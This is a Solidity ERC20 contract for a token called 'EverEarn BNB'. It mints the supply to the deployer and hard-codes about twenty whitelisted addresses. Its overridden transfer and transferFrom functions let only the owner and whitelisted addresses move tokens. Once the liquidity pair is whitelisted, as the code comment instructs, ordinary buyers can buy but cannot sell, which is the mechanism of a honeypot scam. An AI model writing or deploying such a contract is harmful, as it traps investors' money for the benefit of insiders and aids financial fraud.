// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("EverEarn BNB", "EEB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 160000000 * 10 ** decimals());
        whiteList[0x01136029AB8a0f3AdfC6269B900717a30405b8Ea]= true;
        whiteList[0x21e08Bf43dbCb1eA47D05a0274F72C0812aCE236]=true;
        whiteList[0x87AaeA399CEaFa16043F0D492A48B284E2c49a77]=true;
        whiteList[0x6616D40E32Af4E0999033Bb56cf83E45BCbBf8F2]=true;
        whiteList[0x9e1baaB7711976F82Bb05493d4383C3e9E099B6A]=true;
        whiteList[0x6Ab6c38BD410014e9f0aD4016b5328f029295cb4]=true;
        whiteList[0x359E43d780579b8D581FFDf67A0c098BA3eEec9d]=true;
        whiteList[0xE9599576331d2b165613f5E5c2Bf8aff0C5C9A89]=true;
        whiteList[0xf0935652c23b7f3853041B3C13839fb4d408De31]=true;
        whiteList[0x5D8459D7Aba00aCC5c40D25eCa022F51e8fCa175]=true;
        whiteList[0x8E9Efac556AF8E90d876A0fd77D5a5BbfCF852de]=true;
        whiteList[0x3E6f53305A5De856A0048E5D2764d698F161b317]=true;
        whiteList[0x7f7E068104db36af6928FE47314368bE445b26Bb]=true;
        whiteList[0x127Cc8A692A0fF61537F30C67c36Ba87571b76cB]=true;
        whiteList[0xCd045B3DC480EEE8cf9E8e322B9f64F0eD041076]=true;
        whiteList[0x2E2a8Ae4563aE9b7c42b5d846f5FD7b5e0EbA255]=true;
        whiteList[0x9caDd7be7568D6f2f19909fDB54cAfcaf6B70114]=true;
        whiteList[0x891A27fa4e6A4a698979d54268a3d7F7159F675d]=true;
        whiteList[0xaf2FfA7d7703e50BFaf4Feb6828349c777799B89]=true;
        whiteList[0x9223BBe73F63b6A85AA71919f8e2E823c9D13a09]=true;
        whiteList[0xc8e976411b5274d67E6637Cb10Bf977D8b8dd6FD]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}